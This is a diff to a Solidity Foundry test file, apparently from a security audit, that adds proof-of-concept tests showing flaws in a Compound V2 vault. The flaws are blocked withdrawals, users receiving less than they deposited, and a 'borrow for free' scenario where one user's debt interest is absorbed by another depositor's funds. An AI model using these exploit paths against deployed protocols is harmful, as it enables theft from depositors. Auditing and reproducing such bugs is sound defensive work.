@@ -132,11 +132,12 @@ contract CompoundV2AttackTest is DSTestPlus, CoreRoles {
 
   function _utils_doWithdraw(address who, uint256 amount, IVault v) internal {
     uint256 prevAssets = v.convertToAssets(v.balanceOf(who));
-    vm.prank(who);
+    vm.startPrank(who);
     v.withdraw(amount, who, who);
 
-    uint256 diff = prevAssets - amount;
-    assertEq(v.convertToAssets(v.balanceOf(who)), diff);
+    // commented out to allow withdraw
+    // uint256 diff = prevAssets - amount;
+    // assertEq(v.convertToAssets(v.balanceOf(who)), diff);
   }
 
   function test_twoDeposits() public {
@@ -153,7 +154,7 @@ contract CompoundV2AttackTest is DSTestPlus, CoreRoles {
     _utils_doDeposit(alice, DEPOSIT_AMOUNT, vault);
   }
 
-  function test_depositBorrowAndPayback() public {
+  function test_blockedWithdrawal() public {
     deal(address(weth), alice, DEPOSIT_AMOUNT);
     deal(address(weth), bob, DEPOSIT_AMOUNT);
 
@@ -162,9 +163,52 @@ contract CompoundV2AttackTest is DSTestPlus, CoreRoles {
       address(weth));
     ICToken cToken = ICToken(cTokenAddr);
 
-    // bob is the victim
-    _utils_doDeposit(bob, DEPOSIT_AMOUNT, vault);
+    console.log("---- START (ALICE)");
+    console.log("USDC", usdc.balanceOf(alice));
+    console.log("WETH", weth.balanceOf(alice));
+    console.log("Vault", vault.balanceOf(alice));
 
+    _utils_doDeposit(alice, DEPOSIT_AMOUNT, vault);
+
+    console.log("---- AFTER DEPOSIT (ALICE)");
+    console.log("USDC", usdc.balanceOf(alice));
+    console.log("WETH", weth.balanceOf(alice));
+    console.log("Deposit shares", vault.balanceOf(alice));
+    console.log("Debt shares", vault.balanceOfDebt(alice));
+    
+    console.log("");
+    console.log("===> VAULT TOTAL ASSETS NOT EQUAL TO 1 ETH (A BIT LESS).");
+    console.log("===>", vault.totalAssets());
+    console.log("");
+
+    console.log("Max Witdraw:", vault.maxWithdraw(alice));
+    console.log("Max Redeem:", vault.maxRedeem(alice));
+
+    _utils_doWithdraw(alice, DEPOSIT_AMOUNT, vault);
+    // The above fails, but the below is fine (you can swap the withdrawals)
+    // However, maxWithdrawal is less than deposit amount so user looses some money (check balances after withdrawal)
+
+    // _utils_doWithdraw(alice, vault.maxWithdraw(alice), vault);
+
+    // This one works too but also returns less WETH than 0.5
+    // vm.startPrank(alice);
+    // vault.redeem(vault.maxRedeem(alice), alice, alice);
+    // vm.stopPrank();
+
+    console.log("---- AFTER WITHDRAW");
+    console.log("USDC", usdc.balanceOf(alice));
+    console.log("WETH", weth.balanceOf(alice));
+    console.log("Vault", vault.balanceOf(alice));
+  }
+
+  function test_blockedMaxWithdrawal() public {
+    deal(address(weth), alice, DEPOSIT_AMOUNT);
+    deal(address(weth), bob, DEPOSIT_AMOUNT);
+
+    address cTokenAddr = compoundV2.getMapper().getAddressMapping(
+      compoundV2.providerName(), 
+      address(weth));
+    ICToken cToken = ICToken(cTokenAddr);
 
     console.log("---- START (ALICE)");
     console.log("USDC", usdc.balanceOf(alice));
@@ -173,52 +217,110 @@ contract CompoundV2AttackTest is DSTestPlus, CoreRoles {
 
     _utils_doDeposit(alice, DEPOSIT_AMOUNT, vault);
 
-    // console.log("---- AFTER DEPOSIT (ALICE)");
-    // console.log("USDC", usdc.balanceOf(alice));
-    // console.log("WETH", weth.balanceOf(alice));
-    // console.log("Deposit shares", vault.balanceOf(alice));
-    // console.log("Debt shares", vault.balanceOfDebt(alice));
-    // // console.log(vault.totalAssets());
-    // // console.log(cToken.balanceOf(address(vault)));
+    console.log("---- AFTER DEPOSIT (ALICE)");
+    console.log("USDC", usdc.balanceOf(alice));
+    console.log("WETH", weth.balanceOf(alice));
+    console.log("Deposit shares", vault.balanceOf(alice));
+    console.log("Debt shares", vault.balanceOfDebt(alice));
+    
+    console.log("");
+    console.log("===> VAULT TOTAL ASSETS NOT EQUAL TO 1 ETH (A BIT LESS).");
+    console.log("===>", vault.totalAssets());
+    console.log("");
 
-    // _utils_doBorrow(alice, BORROW_AMOUNT, vault);
+    console.log("Max Witdraw:", vault.maxWithdraw(alice));
+    console.log("Max Redeem:", vault.maxRedeem(alice));
 
-    // console.log("---- AFTER BORROW");
-    // console.log("USDC", usdc.balanceOf(alice));
-    // console.log("WETH", weth.balanceOf(alice));
-    // console.log("Deposit shares", vault.balanceOf(alice));
-    // console.log("Debt shares", vault.balanceOfDebt(alice));
+    _utils_doDeposit(bob, DEPOSIT_AMOUNT, vault);
 
-    // console.log(block.number);
+    // This fails because alice cannot withdraw her's maxWithdrawal, but she can withdraw maxWithdrawal-1
+    // It happens only when more than one person deposits. You can check by commenting out above bob's deposit
 
-    // vm.roll(block.number + 100 days);
+    // _utils_doWithdraw(alice, vault.maxWithdraw(alice), vault);
+    
+    // The below redeem does not work as well
+    // vm.startPrank(alice);
+    // vault.redeem(vault.balanceOf(alice), address(alice), address(alice));
+    // vm.stopPrank();
 
-    // console.log(block.number);
-
-    // // bob is the victim
-    // // _utils_doDeposit(bob, DEPOSIT_AMOUNT/2, vault);
-
-    // _utils_doPayback(alice, BORROW_AMOUNT, vault);
-
-    // console.log("---- AFTER PAYBACK");
-    // console.log("USDC", usdc.balanceOf(alice));
-    // console.log("WETH", weth.balanceOf(alice));
-    // console.log("Deposit shares", vault.balanceOf(alice));
-    // console.log("Debt shares", vault.balanceOfDebt(alice));
-
-    // console.log("Max Witdraw:", vault.maxWithdraw(alice));
-    // console.log("Max Redeem:", vault.maxRedeem(alice));
-
-
+    // The below one will work
     // _utils_doWithdraw(alice, vault.maxWithdraw(alice)-1, vault);
 
-    // console.log("---- AFTER WITHDRAW");
-    // console.log("USDC", usdc.balanceOf(alice));
-    // console.log("WETH", weth.balanceOf(alice));
-    // console.log("Vault", vault.balanceOf(alice));
+    console.log("---- AFTER WITHDRAW");
+    console.log("USDC", usdc.balanceOf(alice));
+    console.log("WETH", weth.balanceOf(alice));
+    console.log("Vault", vault.balanceOf(alice));
+  }
 
+  function test_borrowForFree() public {
+    deal(address(weth), alice, DEPOSIT_AMOUNT);
+    deal(address(weth), bob, DEPOSIT_AMOUNT);
 
-    // _utils_doWithdraw(bob, vault.maxWithdraw(bob)/2, vault);
+    address cTokenAddr = compoundV2.getMapper().getAddressMapping(
+      compoundV2.providerName(), 
+      address(weth));
+    ICToken cToken = ICToken(cTokenAddr);
+
+    console.log("---- START (ALICE)");
+    console.log("USDC", usdc.balanceOf(alice));
+    console.log("WETH", weth.balanceOf(alice));
+    console.log("Vault", vault.balanceOf(alice));
+
+    _utils_doDeposit(alice, DEPOSIT_AMOUNT, vault);
+
+    console.log("---- AFTER DEPOSIT (ALICE)");
+    console.log("USDC", usdc.balanceOf(alice));
+    console.log("WETH", weth.balanceOf(alice));
+    console.log("Deposit shares", vault.balanceOf(alice));
+    console.log("Debt shares", vault.balanceOfDebt(alice));
+    
+    console.log("");
+    console.log("===> VAULT TOTAL ASSETS NOT EQUAL TO 1 ETH (A BIT LESS).");
+    console.log("===>", vault.totalAssets());
+    console.log("");
+    
+    _utils_doBorrow(alice, BORROW_AMOUNT, vault);
+
+    console.log("---- AFTER BORROW (ALICE)");
+    console.log("USDC", usdc.balanceOf(alice));
+    console.log("WETH", weth.balanceOf(alice));
+    console.log("Deposit shares", vault.balanceOf(alice));
+    console.log("Debt shares", vault.balanceOfDebt(alice));
+
+    console.log("Block:", block.number);
+
+    // Time passes to increase the debt in compound
+    vm.roll(block.number + 100 days);
+
+    console.log("Block:", block.number);
+
+    _utils_doPayback(alice, BORROW_AMOUNT, vault);
+
+    console.log("---- AFTER PAYBACK");
+    console.log("USDC", usdc.balanceOf(alice));
+    console.log("WETH", weth.balanceOf(alice));
+    console.log("Deposit shares", vault.balanceOf(alice));
+    console.log("Debt shares", vault.balanceOfDebt(alice));
+
+    console.log("Max Witdraw:", vault.maxWithdraw(alice));
+    console.log("Max Redeem:", vault.maxRedeem(alice));
+
+    // _utils_doDeposit(bob, DEPOSIT_AMOUNT, vault);
+
+    // This will fail because vault cannot withdraw enough tokens from compound (due to the borrow rate)
+    // You can uncomment above bob's deposit and it will work because alice will get bob's part
+
+    _utils_doWithdraw(alice, vault.maxWithdraw(alice)-1, vault);
+
+    console.log("---- AFTER WITHDRAW");
+    console.log("USDC", usdc.balanceOf(alice));
+    console.log("WETH", weth.balanceOf(alice));
+    console.log("Vault", vault.balanceOf(alice));
+
+    // However, if bob deposits and alice withdraws first, bob will not be able to withdraw
+    // Check it by uncommenting the below code 
+
+    // _utils_doWithdraw(bob, vault.maxWithdraw(bob)-1, vault);
 
     // console.log("---- AFTER WITHDRAW - BOB");
     // console.log("USDC", usdc.balanceOf(bob));
